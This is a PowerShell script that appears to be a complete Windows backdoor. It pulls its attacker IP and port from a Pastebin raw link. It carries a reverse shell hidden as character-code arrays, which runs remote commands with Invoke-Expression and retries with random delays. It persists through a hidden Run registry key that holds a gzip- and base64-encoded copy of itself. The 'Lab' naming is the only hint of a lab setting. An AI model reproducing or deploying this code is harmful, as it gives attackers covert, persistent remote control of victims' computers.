# ===============================          
# 1️⃣ CONFIGURATION FETCHING          
# ===============================          
$ConfigURL = "https://pastebin.com/raw/rkczY4QW"  # Pastebin raw link          
try {          
    $ConfigRaw = Invoke-WebRequest -Uri $ConfigURL -UseBasicParsing -ErrorAction Stop          
    $Config = $ConfigRaw.Content | ConvertFrom-Json          
} catch {          
    Write-Host "Failed to fetch configuration, exiting."          
    exit          
}          

# সরাসরি প্লেইন টেক্সট ব্যবহার
$R1 = $Config.IP
$R2 = $Config.Port
$R4 = "$env:APPDATA\" + ('l'+'a'+'b'+'x'+'.tmp')

# ===============================          
# 2️⃣ OBFUSCATED REVERSE SHELL (With Jitter)          
# ===============================          
$Lines=@(
    @(36,119,104,105,108,101,40,36,116,114,117,101,41,123),           # while($true){
    @(36,116,114,121,123),                                              # try{
    @(36,99,108,105,101,110,116,61,78,101,119,45,79,98,106,101,99,116,32,83,121,115,116,101,109,46,78,101,116,46,83,111,99,107,101,116,115,46,84,99,112,67,108,105,101,110,116,40,36,82,49,44,36,82,50,41,59),
    @(36,115,116,114,101,97,109,61,36,99,108,105,101,110,116,46,71,101,116,83,116,114,101,97,109,40,41,59),
    @(91,98,121,116,101,91,93,93,36,98,117,102,102,101,114,61,48,46,46,54,53,53,51,53,124,37,123,48,125,59),
    @(36,100,97,116,97,61,34,34,59),                                     # Junk line: $data=""
    @(119,104,105,108,101,40,40,36,105,61,36,115,116,114,101,97,109,46,82,101,97,100,40,36,98,117,102,102,101,114,44,48,44,36,98,117,102,102,101,114,46,76,101,110,103,116,104,41,41,32,45,110,101,32,48,41,123),
    @(36,100,97,116,97,61,40,78,101,119,45,79,98,106,101,99,116,32,45,84,121,112,101,78,97,109,101,32,83,121,115,116,101,109,46,84,101,120,116,46,65,83,67,73,73,69,110,99,111,100,105,110,103,41,46,71,101,116,83,116,114,105,110,103,40,36,98,117,102,102,101,114,44,0,36,105,41,59),
    @(36,115,101,110,100,98,97,99,107,61,40,105,101,120,32,36,100,97,116,97,32,50,62,38,49,124,79,117,116,45,83,116,114,105,110,103,32,41,59,36,115,101,110,100,98,97,99,107,50,61,36,115,101,110,100,98,97,99,107,43,34,80,83,32,34,43,40,112,119,100,41,46,80,97,116,104,43,34,62,32,34,59),
    @(36,115,101,110,100,66,121,116,101,61,40,91,116,101,120,116,46,101,110,99,111,100,105,110,103,93,58,58,65,83,67,73,73,41,46,71,101,116,66,121,116,101,115,40,36,115,101,110,100,98,97,99,107,50,41,59),
    @(36,115,116,114,101,97,109,46,87,114,105,116,101,40,36,115,101,110,100,66,121,116,101,44,0,36,115,101,110,100,66,121,116,101,46,76,101,110,103,116,104,41,59,36,115,116,114,101,97,109,46,70,108,117,115,104,40,41,125,59),
    @(36,99,108,105,101,110,116,46,67,108,111,115,101,40,41,125,),
    @(99,97,116,99,104,123,),
    @(36,115,108,101,101,112,61,71,101,116,45,82,97,110,100,111,109,32,45,77,105,110,105,109,117,109,32,51,48,48,32,45,77,97,120,105,109,117,109,32,54,48,49,59),
    @(83,116,97,114,116,45,83,108,101,101,112,32,45,83,101,99,111,110,100,115,32,36,115,108,101,101,112,125,125)
)

function Rnd-Dec([int[]]$A){-join($A|%{[char]$_})}

$Dscrpt=""
foreach($L in $Lines){$Dscrpt+=(Rnd-Dec $L)+"`r`n"}

function Rnd-Run{$ScriptToRun=$Dscrpt; Invoke-Expression $ScriptToRun}

# ===============================          
# 3️⃣ PERSISTENCE          
# ===============================          
function Rnd-Persist{
    $Rk="HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $Nm="LabUltraX"
    if(-not(Get-ItemProperty $Rk -Name $Nm -ErrorAction SilentlyContinue)){
        $Cmd = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -C `"`$S=New-Object IO.MemoryStream(,[Convert]::FromBase64String('$(Compress-String $MyInvocation.MyCommand.Definition)'));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream(`$S,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()`""
        Set-ItemProperty -Path $Rk -Name $Nm -Value $Cmd
    }
}

function Compress-String([string]$InputString){
    $Bytes = [System.Text.Encoding]::UTF8.GetBytes($InputString)
    $MemoryStream = New-Object System.IO.MemoryStream
    $GzipStream = New-Object System.IO.Compression.GzipStream($MemoryStream, [System.IO.Compression.CompressionLevel]::Optimal)
    $GzipStream.Write($Bytes, 0, $Bytes.Length)
    $GzipStream.Close()
    $MemoryStream.Close()
    return [System.Convert]::ToBase64String($MemoryStream.ToArray())
}

# ===============================          
# 4️⃣ MAIN EXECUTION          
# ===============================          
Rnd-Persist
Rnd-Run
